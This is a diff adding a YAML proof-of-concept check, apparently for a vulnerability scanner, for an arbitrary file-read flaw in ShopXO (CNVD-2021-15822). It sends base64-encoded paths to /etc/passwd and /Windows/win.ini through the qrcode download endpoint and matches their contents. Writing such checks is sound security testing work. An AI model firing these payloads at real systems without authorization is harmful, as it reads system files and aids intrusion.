@@ -1,0 +1,19 @@
+name: poc-yaml-shopxo-cnvd-2021-15822
+groups:
+  Linux:
+    - method: GET
+      path: /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=
+      follow_redirects: false
+      expression: |
+        response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+  Windows:
+    - method: GET
+      path: /public/index.php?s=/index/qrcode/download/url/L1dpbmRvd3Mvd2luLmluaQ=
+      follow_redirects: false
+      expression: |
+        response.status == 200 && response.body.bcontains(b"extensions") && response.body.bcontains(b"for 16-bit app support")
+detail:
+  author: Print1n(http://print1n.top)
+  description: ShopXO download 任意文件读取
+  links:
+    - https://mp.weixin.qq.com/s/69cDWCDoVXRhehqaHPgYog
